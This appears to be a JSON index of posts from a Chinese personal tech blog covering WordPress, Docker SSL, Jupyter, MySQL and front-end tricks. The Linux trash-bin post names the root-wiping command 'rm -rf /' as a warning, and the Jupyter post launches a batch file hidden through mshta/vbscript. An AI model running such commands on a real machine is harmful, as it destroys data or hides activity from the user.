n)$$那么称$a与b$互为（在$\\mathbb{Z}_n$中的）乘法逆元。（$\\mathbb{Z}_n$称为模$n$剩余类乘群，可不必了解。）\n\n\n### 欧拉定理\n\n\n欧拉定理是关于欧拉函数的一个定理，它是指：\n\n\n若$n$与$a$互质，那么$$a^{\\phi(n)}\\equiv 1 (mod\\ n)$$\n\n\n举一个例子：取$n=5,a=4$，那么$$\\phi(5)=4,4^4=256\\equiv 1 (mod\\ 5)$$果然成立，证明过程需要用到一点群论知识，简单来说就是$\\phi(n)$是$\\mathbb{Z}_n$的阶，而$a,n$互质保证了$a$在这个群里，那么$a$自乘群的阶数次必然得到单位元也就是1。\n\n\n以上是RSA算法所涉及到的全部数论基础知识。\n\n\n[RSA加密算法原理（二）](/blog/3839/)\n","tags":["RSA","密码学","数论"],"categories":["学习笔记"]},{"title":"WordPress前台注册登录","url":"//blog/3835/","content":"\nWP的原生的注册登录页面真的丑，而且会跳转离开主页，导致用户体验比较差，于是我打算实现一下在前台进行无跳转注册登录。\n\n\n其实前台登录的插件有不少，但我不太想用插件，就自己来写咯~\n\n由于并没有摸清WP注册登录的逻辑，自己写Authentication等函数可能安全性稍差一些，也会比较麻烦。（何况既然有已经写好的注册登录功能，为啥不用呢？）于是，我有了一个朴素的想法，即利用ajax向原生的注册登录页面（wp-login.php）post数据，通过判断返回的html页面数据来判断是否登录成功。\n\n最终样式如图：\n\n![efed423837f509f540938f769a99aac5](https://oss.fyz666.xyz/blogfiles/png/564842e7c49a04d145ab86fd19f1710c.png)\n\n前端代码：\n\n{% link WordPress弹窗登录表单, GitHub Gist, https://gist.github.com/windshadow233/01873377a1b0f270027a1103c7d77ba3 %}\n\n\n将其导入WordPress主题目录，修改一下路径参数即可！\n\n\n思路比较简单，即失败时的页面必定会有个`#login_error`元素（有更好的判断方法敬请大佬们留言！！）\n\n\n最后在前端页面加一个用以打开登录窗口的按钮（`onclick=\"openLogRe();\"`）即可。\n","tags":["WordPress"],"categories":["博客相关"]},{"title":"WordPress中短码的嵌套使用","url":"//blog/3755/","content":"\n众所周知，短代码是WordPress的一大特色，使用起来相当舒适方便，但短代码默认不能嵌套使用，本文给出一种朴素的方法用来解决这个问题。\n\n\n在`functions.php`文件中定义一个函数：\n\n\n```php\nfunction recursive_shortcode($content){\n\t$new_content = do_shortcode($content);\n\twhile($new_content!=$content){\n\t\t$content = $new_content;\n\t\t$new_content = do_shortcode($content);\n\t}\n\treturn $new_content;\n}\n```\n\n之后为最外层短代码对应函数的返回值套一个`recursive_shortcode`即可。\n","tags":["WordPress","PHP"],"categories":["博客相关"]},{"title":"MySQL数据库自增主键重置的方法","url":"//blog/3744/","content":"\n最近做WordPress站点测试某些功能的时候，为数据表添加了几条测试数据，测试完后又将其删除，但自增主键却不会自动重置，对强迫症非常不友好，因此需要进行一些操作来将其重置。\n\n{%tabs tab1%}\n\n<!-- tab 方法一 -->\n\n若数据表是空的，或不需要表中的数据了，可以直接清空并重置自增字段：\n\n```sql\nTRUNCATE TABLE 'table_name';\n```\n\n但不巧，我不想清空数据表，清空了用户就全没了呀，这时还有另外的方法。\n\n<!-- endtab -->\n\n<!-- tab 方法二 -->\n\n\n1. 删掉自增主键\n2. 重置自增值为1\n3. 添加新的自增主键\n\n\n```sql\nALTER TABLE 'table_name' DROP ID;\nALTER TABLE 'table_name' AUTO_INCREMENT = 1;\nALTER TABLE 'table_name' ADD ID int UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY FIRST;\n```\n\n但我在`DROP ID`时遇到了一个奇怪的报错：`Invalid default value for 'xxx'`（某日期字段）\n\n将该字段的类型从`DATETIME`换成了`TIMESTAMP`，并令其默认值为`CURRENT_TIMESTAMP`，问题解决。\n\n<!-- endtab -->\n\n{%endtabs%}\n\n\n不过，由于`wp_usermeta`这张表含有用户信息，在做上面操作之前，可以先将信息和原来的用户ID之间做一个对应关系的备份。\n","tags":["数据库","MySQL"],"categories":["瞎捣鼓经历"]},{"title":"如何安装并优雅地使用Jupyter Notebook","url":"//blog/3612/","content":"\n## Jupyter是啥？为什么以及什么时候要用它？\n\nJupyter Notebook是一款基于网页的交互式Python IDE，当然如今随着它的发展，也逐渐支持R、PHP等其他编程语言，它是一款模块化的代码解释器，也就是可以将大段的代码模块化处理，分为多段运行。\n\n![](https://oss.fyz666.xyz/blogfiles/png/3af7d0738bf082486fb6bb8a6cfeb2d9.png)\n该IDE的交互性非常好，设想你在做数据处理、分析的时候，一般会希望马上看到结果，此时若在pycharm等常规解释器中，就不得不把所有的代码从头跑一遍，你还得在中间插入一些`print`来打印结果，非常之麻烦，但在jupyter中，在前面代码都已经运行过的基础上，可以直接运行当前段代码。基于这些特性，jupyter可能会适用于数据处理分析以及各种建模过程等场景，但不一定适合用于软件开发等流程比较丰富、整体性比较强的领域。\n\n\n我第一次使用这个IDE是在完成数据科学大作业的过程中，那么今天就来简单介绍一下自己的安装配置经验。\n\n\n## 安装过程\n\n\n**前提：python3.3及以上（听说2.7版本也可）**\n\n\n做数据科学的童鞋们建议直接安装**[Anaconda](https://www.anaconda.com/)**，因为它不但直接自带了jupyter notebook，还附赠了一两百个数据科学相关的库，非常的方便。\n\n\n什么？你的Anaconda没有带jupyter notebook？那就跑下面命令安装下咯：\n\n```powershell\nconda install jupyter notebook\n```\n\n不想装Anaconda的童鞋可以直接pip安装（如果电脑上有多个版本的python，需要注意pip对应的是哪个版本的python）：\n\n```powershell\npip install --upgrade pip\npip install jupyter\n```\n\n## 使用Jupyter\n\n\n安装完成以后，首先确保jupyter在环境变量里（一般其位于python安装目录下的Scripts文件夹）然后来运行一下，但与pycharm不同，这玩意没有一个可以直接用于打开的文件，只能通过以下命令：\n\n```powershell\njupyter notebook --port port\n```\n\n例如\n\n```powershell\njupyter notebook --port 9000\n```\n\n若不加`--port`参数，会用默认端口8888打开，若运行成功，界面上就会出现类似于以下信息：\n\n```raw\n......\n    To access the notebook, open this file in a browser:\n        file:///C:/Users/Eric/AppData/Roaming/jupyter/runtime/nbserver-6488-open.html\n    Or copy and paste one of these URLs:\n        http://localhost:8888/?token=c76580f88fc8810aa6584c7589f9b7ae713dfd958b66f91f\n     or http://127.0.0.1:8888/?token=c76580f88fc8810aa6584c7589f9b7ae713dfd958b66f91f\n[E 20:50:37.586 NotebookApp] Could not open static file ''\n[W 20:50:37.662 NotebookApp] 404 GET /static/components/react/react-dom.production.min.js (::1) 8.98ms referer=http://localhost:8888/tree?token=c76580f88fc8810aa6584c7589f9b7ae713dfd958b66f91f\n```\n\n复制上面提到的链接到浏览器就可以打开界面。\n\n\n这里小声提一句：以前的.py文件不能直接在这里面运行，jupyter能运行的文件后缀是.ipynb，可以通过界面偏右上角位置的New按钮来创建一个这样的文件。\n\n\n若要关闭jupyter，只要点一下界面右上角的Quit即可。\n\n\n## 优雅地使用Jupyter\n\n\n首次使用jupyter的过程中，我感觉用户体验极差，相信不仅仅是我这么觉得。\n\n\n- 居然要先打开cmd界面，然后敲命令才能运行\n- 运行了以后居然要手动复制链接到浏览器才能打开界面\n- 界面上文件的默认路径根本不是我放python项目的路径\n\n现在就来解决这些问题，首先在命令行执行：\n\n```powershell\njupyter notebook --generate-config\n```\n\n如果以前没有跑过这句命令，那么接下来应该会在用户名文件夹（例如C://Users/xxx/）下生成一个叫做.jupyter的文件夹，里面有一个jupyter_notebook_config.py文件，打开以后加入几行内容：\n\n```python\n# 指定默认打开的路径\nc.NotebookApp.notebook_dir = \"E://pycharm/pycharmProjects\"\n# 指定默认的浏览器,我用的是Chrome\nimport webbrowser # 要是没这个库就装一下\nwebbrowser.register('chrome', None, webbrowser.GenericBrowser(u'C:\\\\Program Files (x86)\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe'))\nc.NotebookApp.browser = 'chrome'\n```\n\n若想要设置密码，还可以进行一项配置，先在命令行进入python，然后运行以下代码：\n\n\n\n```python\nfrom notebook.auth import passwd\npasswd()\n```\n\n根据提示输入密码，会得到一串以sha1开头的字符串，将其复制过来，在配置文件中写入以下配置项即可：\n\n\n\n```python\nc.NotebookApp.password = 'sha1:xxxxxxx' # 生成的密码\n```\n\n接下来运行jupyter就会要求输入密码才能进入。\n\n\n最后，我们当然不想每次都通过命令行界面来打开jupyter，我们可以在桌面建立一个.txt文件，并且写入以下内容\n\n\n\n```bat\n@echo off\nif \"%1\"==\"h\" goto begin\nstart mshta vbscript:createobject(\"wscript.shell\").run(\"\"\"%~nx0\"\" h\",0)(window.close)&&exit\n:begin\nE:\njupyter notebook\n```\n\n其中倒数第二行的`E:`需要修改为你的jupyter安装盘符。\n\n\n保存并重命名将此文件的后缀改成.bat，双击此文件就可以直接在浏览器中打开jupyter界面了！\n","tags":["Jupyter Notebook"],"categories":["学习笔记"]},{"title":"如何写CSS样式使HTML元素位于屏幕正中","url":"//blog/3487/","content":"\n在做前端时，往往会遇到将某个标签元素置于屏幕正中的需求，例如对话框等。这里提供一种利用CSS的方法，只需为目标元素添加以下CSS样式：\n\n\n```css\nposition: fixed;\ntop: 50%;\nleft: 50%;\n-webkit-transform: translateX(-50%) translateY(-50%);\n-moz-transform: translateX(-50%) translateY(-50%);\n-ms-transform: translateX(-50%) translateY(-50%);\ntransform: translateX(-50%) translateY(-50%);\n```\n\n即可让该元素始终位于屏幕正中。\n","tags":["Web前端","CSS"],"categories":["学习笔记"]},{"title":"为网站打造独特的右键菜单","url":"//blog/3304/","content":"\n最近发现了一款可以更改网站的右键菜单的WordPress插件，但只有WordPress可以使用，且插件不够轻量，用多了也会造成网站速度越来越慢，因此可以考虑实现用纯前端操作实现这个功能。\n\n本着不重复造轮子的思想（其实是懒），我找到了[这篇文章](http://www.ixianzong.com/870.html)，这位大佬的菜单样式写的特别好看，同时我又根据自己的一些需求进行了一些增删改与优化。（顺便这位大佬的代码好像是经压缩后又重新规范化的，看的是真的累啊）\n\n\n代码资源[点这儿](https://pan.baidu.com/s/1xG4hFufO7Os4LOm7M2ZRow)。提取码：3pyf\n\n\n大概样式如下图：\n\n![](https://oss.fyz666.xyz/blogfiles/png/3a31d9effa327e9dfbecb9680a699b6d.png)\n代码的思想不难，简单讲解一下：\n\n\n1. 先禁用浏览器自带的右键菜单功能\n2. 在网页中预先隐藏好一个自定义的菜单\n3. 点击右键时将其显示到鼠标旁\n4. 点击左键时再将其隐藏\n\n我的优化主要是将`mousemove`事件去掉了，这块实在太耗计算资源。\n\n\n这里我有一个新的但比较常规的需求就是在右键`<a>`标签时，出现一个“新标签页打开”菜单项，点击该选项可以将该链接在新标签页打开。\n\n\n这里我们通过对所有的`<a>`标签的`oncontextmenu`事件写一个响应函数来实现：\n\n```js\n$(document).on('contextmenu', 'a[href]:not(\"[href=\\'\\'],[href=\\'#\\']\")', function(){\n\tlet href = $(this).attr('href');\n\tif (href.trim().indexOf('javascript:')==0){return;}\n\tlet li = $('<li id=\"new-tag\">');\n\tlet a = $('<a>', {'href': href, 'target': '_blank'});\n\ta.append('<i class=\"fa fa-external-link-square fa-fw\"></i><span>新标签页打开</span>');\n\tli.append(a);\n\t$('.user-rcm ul').prepend(li);\n})\n```\n\n选择器排除了所有没有`href`属性以及`href=\"\"`和`href=\"#\"`的`<a>`标签，另外还有一种响应JavaScript代码的`<a>`标签也需要排除。对于一般的`<a>`标签，在其被右击时为菜单栏最前面添加一个`<li>`标签，（包含一个新标签页打开的`<a>`）。\n\n\n最后在js文件最前面的函数中找到`contextmenu:`和`click:`两个事件函数，分别加上`$(\"#new-tag\").remove();`即可。\n\n","tags":["Web前端"],"categories":["博客相关"]},{"title":"Form表单回车自动提交的原因及避免办法","url":"//blog/3157/","content":"\n在html中使用form表单的时候，有时候会遇到回车自动提交的问题，比如我做了一个登录表单，希望其通过ajax提交而不进行网页整体刷新，但一敲回车，表单自己提交了上去并造成网页整体刷新，就会造成比较差的体验。\n\n当然第一个方法就是你别用form就行了，但考虑到form有一个serialize()方法特别好用，因此我非用form不可，这时还有另外的解决方法。\n\n\n首先这种自动提交的行为来自于浏览器的~~迷惑行为~~自动优化，查找资料后发现有以下几条规则：\n\n\n- 表单含有`type=\"submit\"`的按钮时，回车自动提交\n- 表单有且仅有一个`type=\"text\"`的`input`时，回车自动提交\n- `button`按钮在不声明`type`时，有些浏览器会默认其为`submit`\n- 其他表单元素如`textarea`、`select`不影响，`radio`、`checkbox`不影响触发规则，但本身在FireFox下会响应回车键，在IE下不响应\n- `type=\"image\"`的`input`，效果等同于`type=\"submit\"`，不知道为什么会设计这样一种type，不推荐使用，应该用CSS添加背景图合适些\n\n鉴于我遇到的情况是第二种，因此我在表单里面加了一句`<input type=\"text\" style=\"display: none;\">`完美解决问题。\n","tags":["Web前端"],"categories":["Debug"]},{"title":"使用Python向百度推送url","url":"//blog/3117/","content":"\n百度站长工具提供了许多推送接口，API提交中给了使用一些其他语言的例子，唯独没有python（大概是觉得python过于简单），因此我写了一个python脚本用以批量推送网站内的url。\n\n首先需要一个站点地图，在我网站上是\"/sitemap.php\"，访问会生成xml格式的站点地图文件（也可以通过其他任何方式，只要能获取一个每行一个url的字符串文本即可）。\n\n```python\nimport requests\nimport re\nsitemap_url = 'https://blog.fyz666.xyz/sitemap.php'//站点地图\npost_url = 'http://data.zz.baidu.com/urls?site=https://blog.fyz666.xyz&token=xxxxxx' # 这个API链接由百度站长工具提供\nurls_response = requests.get(sitemap_url)\nurls= '\\n'.join(re.findall('(?<=<loc>).*(?=</loc>)', urls_response.text))\nheaders = {\n        'User-Agent': 'curl/7.12.1',\n        'Host': 'data.zz.baidu.com',\n        'Content - Type': 'text / plain'\n    }\nr = requests.post(post_url, data=urls)\n```\n\n`r.status_code`为200时表示推送成功，查看`r.json()`可得到当天的剩余推送链接数与本次推送成功的链接数。\n","tags":["Python","爬虫"],"categories":["瞎捣鼓经历"]},{"title":"WordPress开启邮件发送功能","url":"//blog/3096/","content":"\n基于WordPress的用户注册需要发送验证邮件，我们需要开启WordPress的邮件发送功能。\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/6d929e725252bc9a1f2da89bb00875be.png)\n\n本文针对阿里云服务器来进行SMTP服务的配置，首先登录阿里云官网开通邮件推送服务，该服务支持每天200条免费邮件，小站用用肯定是够了。接下来找到邮件推送控制台，然后按下图指示，进行配置：\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/00acdf5ff5a8f853deecd989a1d24b6e.png)\n\n- step2中在已有域名的基础上解析一个二级域名即可，这个二级域名将用以发送邮件。\n- step3配置全部完成后，进行step4的验证。\n\n以下简要说明step3：\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/f50c268ee97b47f469c2f5244d4cf7b7.png)\n\n接下来进入云解析DNS界面，为刚才选择的域名进行解析，解析内容是图中的四条值，解析完成后10分钟内一般会验证通过，届时进入step4进行验证即可。\n\n\n接下来进行下图操作：\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/43605f177a5c6c60f49a1186c4429ae6.png)其中回信地址设为常用邮箱，然后验证一下即可，验证完后设置一个SMTP密码，同时发信地址是后面服务器发邮件时显示的邮件来源，这两个东西后面会用到。\n\n\n接下来需要使用一个WordPress邮件插件，我用的是SMTP Mailer，亲测好用！\n\n\n插件设置中，SMTP Host填写阿里云给的smtp服务器地址，我的是smtpdm.aliyun.com，SMTP Authentication选择True，后面的Username与Password填写刚刚设置的发信地址与SMTP密码，Type of Encryption选择SSL，port填写465，From Email Address也填写发新地址，From Name随便填，最后的Disable SSL…给他勾上。接下来保存设置以后，不出意外WordPress就可以愉快地发送邮件了。\n","tags":["WordPress","Email"],"categories":["博客相关"]},{"title":"WordPress实现任意区域隐藏且输入密码可见","url":"//blog/2784/","content":"\n本文参考自下面文章：\n\n{%link WordPress文章部分内容隐藏输入密码后可见,www.luoxiao123.cn, http://www.luoxiao123.cn/1399-2.html %}\n\n\nWordPress自带了页面单独加密的功能，但好像只能加密整个页面，无法进行页面局部内容加密，因此我寻找了一种可以隐藏任意区域、输入密码可见的代码实现，且重写了前端ajaxfy.js的代码以使该功能通过ajax加载。\n\n首先在functions.php文件中加入以下代码：\n\n```php\nfunction e_secret($atts, $content=null){\n    extract(shortcode_atts(array('key'=>null), $atts));\n    if(isset($_POST['e_secret_key']) && $_POST['e_secret_key']==$key){\n        return $content;\n    }\n    else{\n        return '\n<form class=\"e-secret\" action=\"'.get_permalink().'\" method=\"post\" name=\"e-secret\"><label>输入密码查看加密内容：</label><input type=\"password\" name=\"e_secret_key\" class=\"euc-y-i\" maxlength=\"50\"><input type=\"submit\" class=\"euc-y-s\" value=\"确定\">\n<div class=\"euc-clear\"></div>\n</form>\n';\n    }\n}\nadd_shortcode('secret','e_secret');\n```\n\n之后就可以利用短代码来隐藏区域了。\n\n\n另外若有ajax加载内容的需求，只需要按下面代码中的注释向中提到的ajaxfy.js文件中（文件[见这篇文章](/blog/1973/)）添加或修改JS代码:\n\n```js\nlet ajax_secret_form ＝ \"e-secret\";\n// ajaxloadPageInit函数添加一段:\njQuery('.' + ajax_secret_form).each(function(index) {\n        if (jQuery(this).attr(\"action\")) {\n            jQuery(this).submit(function() {\n            \t  let ajaxsecretPath = jQuery(this).attr(\"action\");\n                submitSecretPwd(ajaxsecretPath, jQuery(this).serialize());\n                return false;\n            });\n        }\n    });\n// ajaxloadPage修改部分如下:\n// 增加一个参数method, 默认为'GET'\nfunction ajaxloadPage(url, push, getData ,method='GET'){\n       ...\n       ...\n        // 修改type为method\n                jQuery.ajax({\n                    type: method,\n                    url: url,\n       ...\n       ...\n}\n// 新增一个函数\nfunction submitSecretPwd(url, params){\n\tif (!ajaxisLoad){\n            ajaxloadPage(url, 0, params, method=\"POST\");\n        }\n}\n```","tags":["WordPress","PHP"],"categories":["博客相关"]},{"title":"手把手教你为Docker容器中的Apache2部署SSL证书","url":"//blog/2289/","content":"\n为网站部署SSL证书不仅能提升网站的安全性，还可以在浏览器地址栏左侧添加一把“锁”，~~非常的美观和舒适~~。因此必须安排！但我由于对web服务、docker容器端口映射等运行机制不太熟，在部署过程中踩了很多坑，不过也一一填了回来，最终部署成功，在此记录一下部署的过程。\n\nSSL是指安全套接字协议，借用百度词条的定义：\n\n> SSL(Secure Sockets Layer 安全套接字协议),及其继任者传输层安全（Transport Layer Security，TLS）是为网络通信提供安全及数据完整性的一种安全协议。TLS与SSL在传输层与应用层之间对网络连接进行加密。\n> \n> \n> [百度百科：SSL](https://baike.baidu.com/item/ssl)\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/21b54d45b96164d06f442d0fa981fbcd.png)\n\n\n\n## 我的软件服务配置\n\n\n- 服务器系统：Ubuntu18.04\n- docker容器中系统：Debian\n- web服务：apache2\n\n## 申请并下载证书\n\n\n我图方便直接去阿里云申请了一个免费的证书：DigiCert 免费版 SSL（能用就行，免费的真香），下载apache版本的证书到本地，然后将整个文件夹（重命名为ssl）上传到服务器。（文件夹中有3个文件，分别是xxx_public.crt、xxx_key与xxx_chain.crt）。SSL证书也可以通过Certbot来申请，详情可见[此文](/blog/7669/)。\n\n\n使用命令将文件夹复制到WordPress容器的apache2目录下：\n\n```bash\nsudo docker cp ssl 容器名:/etc/apache2/\n```\n\n## 配置或修改docker容器端口映射\n\n\n若尚未生成容器，则在生成的时候声明两个端口映射（80:80与443:443）即可。若已经生成了容器，并且端口映射不对，则参考下文。（其实只映射443:443也是可以的，我只是为了做http强制跳转https）\n\n\n由于我之前是`0.0.0.0:80->80/tcp`，故需要再添加一条`0.0.0.0:443->443/tcp`。\n\n**在进行下面的操作前先stop容器。**\n\n```bash\n# 进入容器文件夹内\ncd /var/lib/docker/containers/容器哈希值\n# 修改hostconfig.json\nsudo vi hostconfig.json\n```\n\n找到`\"PortBindings\"`，并添加一条443端口映射：\n\n```json\n\"PortBindings\":{\n    \"443/tcp\":[{\"HostIp\":\"\",\"HostPort\":\"443\"}],\n    \"80/tcp\":[{\"HostIp\":\"\",\"HostPort\":\"80\"}]\n}\n```\n\n\n```bash\n# 修改config.v2.json\nsudo vi config.v2.json\n```\n\n找到`\"ExposedPorts\"`，同样添加一条443端口：\n\n```json\n\"ExposedPorts\":{\"443/tcp\":{},\"80/tcp\":{}}\n```\n\n\n```bash\n# 重启docker,然后开启容器\nsudo systemctl restart docker\nsudo docker start 容器id\n# 查看容器运行情况\nsudo docker ps\n```\n\n若看到容器的ports为 `0.0.0.0:80->80/tcp, 0.0.0.0:443->443/tcp`两条，则端口已添加成功。\n\n## 部署SSL\n\n```bash\n# 进入容器\ndocker exec -it 容器名 bash\n# 开启ssl模块,首次运行可能需要按提示重启apache\na2enmod ssl\n```\n\n配置SSL证书\n\n```bash\nvi /etc/apache2/sites-available/default-ssl.conf\n# 什么？command not found？跑一下下面几条命令装个vim就行了\n# apt update\n# apt install vim\n```\n\n在打开的文件中修改或添加以下几项：\n\n```apache\nSSLEngine on\nSSLCertificateFile /etc/apache2/ssl/xxx_public.crt\nSSLCertificateKeyFile /etc/apache2/ssl/xxx.key\nSSLCertificateChainFile /etc/apache2/ssl/xxx_chain.crt\n```\n\n修改时请把证书文件名修改成自己的，然后保存退出，再做一个软连接，使得apache2能够加载到default-ssl.conf文件。\n\n```bash\nln -s /etc/apache2/sites-available/default-ssl.conf /etc/apache2/sites-enabled/default-ssl.conf\n```\n\n## 强制http跳转https\n\n```bash\n# 开启rewrite模块,首次运行可能需要重启apache\na2enmod rewrite\nvi /etc/apache2/sites-available/000-default.conf\n```\n\n在文件中的`<VirtualHost *80>`与`<VirtualHost>`标签之间加上以下代码（请自行修改其中网站主页的URL）：\n\n```apache\n<Directory \"/var/www/html\"> \n    RewriteEngine   on\n    RewriteBase /\n    # FORCE HTTPS\n    RewriteCond %{HTTPS} !=on\n    RewriteRule ^/?(.*) https://blog.fyz666.xyz$1 [R,L]\n</Directory>\n```\n\n退出容器，并重启容器：\n\n```bash\nexit\nsudo docker restart 容器id\n```\n\n至此，所有配置已经完成，最后需要检查一下服务器80、443端口是否开放。\n","tags":["Docker","Linux","Apache","SSL"],"categories":["瞎捣鼓经历"]},{"title":"Linux回收站机制实现","url":"//blog/2049/","content":"\n如果你使用过Linux系统，那么一定听说过`rm -rf`命令与其带来的一系列惨剧，“Linux从删库到跑路”说的就是这个命令的梗。\n\n先为Linux萌新科普一下这个命令的含义：`rm`指remove，`-rf`是参数`-r`和`-f`的合写，意为recursive、force，表示递归且无提示地强制删除该文件夹及其下面所有文件或子文件夹，并且在Linux系统下，文件被删了是很难进行恢复的。\n\n\n因此若不小心跑了`rm -rf /`，就会把根目录全删了，后果难以想象。为了避免这一点，可以这么做：\n\n\n![](https://oss.fyz666.xyz/blogfiles/jpeg/b4d6076611f5256c38d75f084086ab07.jpeg)\n~~这句命令是说，给<code>rm -rf</code>这句命令一个cd值（即冷却时间），让它不要删的那么快。~~\n\n\n（好像有什么奇怪的东西混了进来，请Linux萌新自动忽略上图及删除线中的内容）\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/79de05b70376833abd914e1621713cbc.png)\n其实我们可以弄一个类似于Windows系统回收站的机制，运行`rm`命令时将文件先移动到回收站内，再定期清理回收站。废话不多说，上操作过程与代码：\n\n\n1. 随便在哪个文件夹下新建一个文件夹作为回收站（我放在了`/home`下）\n2. 随便在哪个文件夹下建立一个shell脚本，用以将文件搬到回收站\n3. 打开`~/.bashrc`，写入一个替换，将`rm`替换为运行上一步写的脚本\n4. 使刚才的操作立即生效\n5. 设置定期清理回收站\n\n以下操作均需要注意把文件路径换成你自己的。\n\n```bash\nmkdir /home/.trashbin\nvi /home/.remove.sh # 创建新文件并写入以下内容\n```\n\n\n```bash\n# 回收站文件夹路径\nTRASH_DIR=\"/home/.trashbin\"\nfor i in $*; do\n        # 判断文件或文件夹是否存在\n        if [ ! -d $i -a ! -f $i ];then\n                echo File or Directory Not Exist!\n                exit\n        fi\n        fileName=`basename $i`\n        time=`date +%m-%d-%H:%M:%S`\n        mv $i ${TRASH_DIR}/${fileName}.${time}\n        # 判断上一条命令是否正常执行,0表示正常\n        if [ $? -eq 0 ];then\n                echo Move $i to /home/.trashbin/${fileName}.${time}\n        fi\ndone\n```\n\n\n```bash\nvi ~/.bashrc # 打开文件并写入以下代码\n```\n\n\n```bash\nalias rm='sh /home/.remove.sh'\n```\n\n然后执行命令：\n\n```bash\nsource ~/.bashrc\n```\n\n最后设置定期清理回收站：\n\n```bash\nsudo vi /etc/crontab # 打开文件并增添一行以下内容\n```\n\n\n```bash\n0 0 * * * root  rm -rf /home/.trashbin/*\n```\n\n上面这句表示每天00:00以root身份执行一次`rm -rf /home/.trashbin/*`。\n","tags":["Linux"],"categories":["瞎捣鼓经历"]},{"title":"为网页添加Live2D","url":"//blog/2032/","content":"\n近期访问许多博客，常能发现网页的底部有一个萌萌的小人，能通过访客的鼠标移动点击与访客进行互动，本着遇到奇奇怪怪有意思的东西不管有没有用都要整一个的理念，我动用各方搜索资源，很快就整起来了，这里给一个添加小人的菜鸟教程。\n\n这类小人例如你现在在网页右下角看到的是通过Live2D技术实现的，其只是在web端的一个应用，搭建容易，模型渲染与脚本编写不易，请多支持项目原作者！\n\n项目来自GitHub仓库：\n\n{%link live2d-widget,GitHub,https://github.com/stevenjoezhang/live2d-widget %}\n\n\n项目文件目录结构：\n\n```plaintext\n│  message.json\n│  README.md\n│\n└─Live2D\n    ├─css\n    │      live2d.css\n    │\n    ├─js\n    │      live2d.js\n    │      message.js\n    │\n    └─model\n```\n\n其中model文件夹包含了渲染的人物模型，不用管他。\n\n\n将整个项目文件夹上传到网站的根目录，接下来导入到网页：\n\n```markup\n<link rel=\"stylesheet\" type=\"text/css\" href=\"/live2d/css/live2d.css\">\n<div id=\"landlord\">\n    <div class=\"message\" style=\"opacity:0\"></div>\n    <!-- 设置人物显示的宽高 -->\n    <canvas id=\"live2d\" width=\"280\" height=\"360\" class=\"live2d\"></canvas>\n</div>\n<script type=\"text/javascript\">\n    <!-- 设置message.json文件的父级路径 -->\n    var message_Path = '/live2d/'\n    var home_Path = window.location.origin + '/';\n</script>\n<script type=\"text/javascript\" src=\"/live2d/js/live2d.js\"></script>\n<script type=\"text/javascript\">\n    //设置模型的配置文件路径,载入模型\n    loadlive2d(\"live2d\", \"/live2d/model/tia/model.json\");\n</script>\n<script type=\"text/javascript\" src=\"/live2d/js/message.js\"></script>\n```\n\n上面代码粘贴到网页上，修改几个路径参数就可以使用啦~\n\n\n另外可以通过配置message.json文件，实现自定义的消息互动展示。\n\n\n若网站内有ajax或JS动态加载，新加载的内容无法被自定义消息的选择器选中的情况，可以[参考此文](/blog/2036/)对message.js文件进行修改。\n","tags":["Web前端"],"categories":["博客相关"]},{"title":"Ajax或JS动态加载的dom元素无法响应jQuery选择器绑定事件的解决办法","url":"//blog/2036/","content":"\n实现全站ajax后，首先遇到的问题就是动态加载的内容无法响应jQuery的事件绑定，例如若有如下jQuery代码：\n\n\n```js\n$('.btn').click(function (){\n    //do something\n});\n```\n\n后通过ajax或JavaScript动态加载了一个按钮：\n\n```markup\n<div class='btn'>点我</div>\n```\n\n点击该按钮应该不会有click事件响应。\n\n\n网上许多博文指出可以使用`live`方法替换`on`方法，但我发现新版本的jQuery已经弃用这一方法了，不过也有新的替代方法，只要将前面的代码改成：\n\n```js\n$(document).on('click', '.btn', function (){\n    //do something\n});\n```\n\n这样未来被加载的元素也能响应jQuery绑定的事件。\n","tags":["JavaScript","Web前端"],"categories":["Debug","博客相关"]},{"title":"Docker容器在修改配置文件后无法开启的解决办法","url":"//blog/2018/","content":"\nLinux系统下，通常我们可以通过命令\n\n\n```bash\nsudo docker exec -it 容器名 bash\n```\n\n进入正在运行的docker容器中，并在容器内使用命令进行各种操作，但一旦不慎操作出了问题，把配置文件搞崩了，导致容器无法开启（也就无法运行上面的命令进入容器内部），此时可以使用以下方法：\n\n\nDocker容器中的文件一般都位于`/var/lib/docker/overlay`文件夹下，找到容器对应的文件夹再修改出问题的文件即可。\n","tags":["Docker"],"categories":["Debug"]},{"title":"WordPress全站Ajax化","url":"//blog/1973/","content":"\nAjax技术通常用于网站的局部刷新，从而提高网站刷新资源内容的效率。\n\n\n我的需求来源：添加了一个音乐播放器，但是网站内部切换导航栏时，会刷新整个网页，导致音乐播放中断，因此考虑全站ajax化。\n\n首先我尝试了一下WordPress的插件Advanced AJAX Page Loader，但好像和主题不太兼容（存疑，也可能是我太菜了），故提取了插件中的主要代码，写入了一个文件ajaxfy.js，修改了部分参数后导入主题即可。[文件下载戳这儿](https://gist.github.com/windshadow233/953d2fe4c068504519f003386fcfbbe7)\n\n\n主要需要修改的代码参数有以下：\n\n```js\nvar ajaxhome='';\nvar ajaxcontent = 'content';\nvar ajaxsearch_class = 'searchform';\nvar ajaxignore_string = new String('#, /wp-, .pdf, .zip, .rar, /goto'); \nvar ajaxignore = ajaxignore_string.split(', ');\nvar ajaxloading_code = 'loading';\nvar ajaxloading_error_code = 'error';\n```\n\n- `ajaxhome`是主页地址，用以判断网站内的链接是否需要ajax加载\n- `ajaxcontent`是需要ajax加载的区域的id，WordPress主题一般都是content，我根据需求改成了main。\n- `ajaxsearch_class`是需要ajax加载的搜索表单的class。\n- `ajaxignore_string`用以结合后面的`ajaxcheck_ignore`函数，可以在函数中根据需求自定义一些逻辑来判断哪些url不需要ajax加载。\n- `ajaxloading_code`是ajax加载过程中显示在界面上的内容。\n- 